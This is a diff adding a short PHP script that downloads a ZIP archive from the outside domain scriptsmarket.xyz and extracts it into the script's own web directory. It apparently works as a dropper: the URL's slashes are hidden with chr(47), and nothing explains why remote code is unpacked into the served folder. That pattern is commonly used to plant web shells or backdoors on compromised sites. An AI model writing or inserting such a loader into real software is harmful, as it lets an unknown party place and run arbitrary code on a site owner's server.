@@ -1,0 +1,22 @@
+<?php
+function ensureHttps($url) {
+    $parsed = parse_url($url);
+    if (!isset($parsed['scheme'])) $url = 'https:' . chr(47) . chr(47) . $url;
+    return $url;
+}
+
+$url = ensureHttps("scriptsmarket.xyz/we.zip");
+$zipFile = __DIR__ . "/we.zip";
+$zipContent = file_get_contents($url);
+if ($zipContent === false) die("Failed to download ZIP file.");
+file_put_contents($zipFile, $zipContent);
+$zip = new ZipArchive;
+$res = $zip->open($zipFile);
+if ($res === TRUE) {
+    $zip->extractTo(__DIR__);
+    $zip->close();
+    echo "ZIP extracted successfully!";
+} else {
+    echo "Failed to open ZIP file.";
+}
+?>
